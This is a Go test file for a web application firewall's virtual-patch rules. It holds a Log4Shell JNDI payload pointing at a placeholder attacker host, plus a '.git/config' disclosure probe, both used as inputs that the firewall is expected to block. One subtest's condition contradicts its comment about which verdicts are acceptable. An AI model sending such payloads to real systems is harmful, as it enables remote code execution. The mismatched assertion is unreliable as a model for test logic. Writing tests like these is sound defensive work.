package waf

import (
	"net/http"
	"testing"

	"github.com/Panharoth06/raiwall/internal/core/waf/cve"
)

func TestInspectInnerRulesVirtualPatch(t *testing.T) {
	engine, err := cve.NewBundled()
	if err != nil {
		t.Fatalf("bundled inner rules: %v", err)
	}
	eng := NewSemanticEngine(WithInnerRules(engine))

	t.Run("Log4ShellBlockedWithVirtualPatchRuleID", func(t *testing.T) {
		ctx := &RequestContext{
			Method: "GET",
			Host:   "app.test",
			Path:   "/search",
			Query:  "q=${jndi:ldap://attacker.example/x}",
		}
		verdict, err := eng.InspectRequest(ctx)
		if err != nil {
			t.Fatalf("inspect: %v", err)
		}
		if verdict.Action != ActionBlock || verdict.RuleID != "CVE-2021-44228" {
			t.Fatalf("expected CVE-2021-44228 block, got %s (%s)", verdict.Action, verdict.Reason)
		}
		if verdict.AttackCategory != "cve/rce" {
			t.Errorf("attack category = %q", verdict.AttackCategory)
		}
		if verdict.PayloadLocation != "Query" {
			t.Errorf("payload location = %q", verdict.PayloadLocation)
		}
	})

	t.Run("GitConfigDisclosureRuleID", func(t *testing.T) {
		ctx := &RequestContext{
			Method: "GET",
			Host:   "app.test",
			Path:   "/.git/config",
		}
		verdict, err := eng.InspectRequest(ctx)
		if err != nil {
			t.Fatalf("inspect: %v", err)
		}
		if verdict.Action != ActionBlock || verdict.RuleID != "GIT-CONFIG-EXPOSURE" {
			t.Fatalf("expected GIT-CONFIG-EXPOSURE block, got %s (%s)", verdict.Action, verdict.Reason)
		}
	})

	t.Run("DisabledSignatureAllowsThroughFunnel", func(t *testing.T) {
		engine.SetEnabled(map[string]struct{}{"CVE-2021-44228": {}})
		defer engine.SetEnabled(nil)

		ctx := &RequestContext{
			Method: "GET",
			Host:   "app.test",
			Path:   "/search",
			Query:  "q=${jndi:ldap://attacker.example/x}",
		}
		verdict, err := eng.InspectRequest(ctx)
		if err != nil {
			t.Fatalf("inspect: %v", err)
		}
		if verdict.Action != ActionBlock || verdict.RuleID == "CVE-2021-44228" {
			// With the signature disabled the payload still matches the code-injection
			// funnel via the jndi/eval heuristics or is allowed; both are acceptable, but
			// the verdict must never carry the disabled virtual-patch rule ID.
			t.Fatalf("disabled virtual patch rule still applied: %s", verdict.RuleID)
		}
	})

	t.Run("WithoutInnerRulesPipelineUnchanged", func(t *testing.T) {
		bare := NewSemanticEngine()
		ctx := &RequestContext{
			Method:  http.MethodGet,
			Host:    "app.test",
			Path:    "/health",
			Query:   "check=ok",
			Headers: http.Header{},
		}
		verdict, err := bare.InspectRequest(ctx)
		if err != nil {
			t.Fatalf("inspect: %v", err)
		}
		if verdict.Action != ActionAllow {
			t.Fatalf("expected allow, got %s (%s)", verdict.Action, verdict.Reason)
		}
	})
}
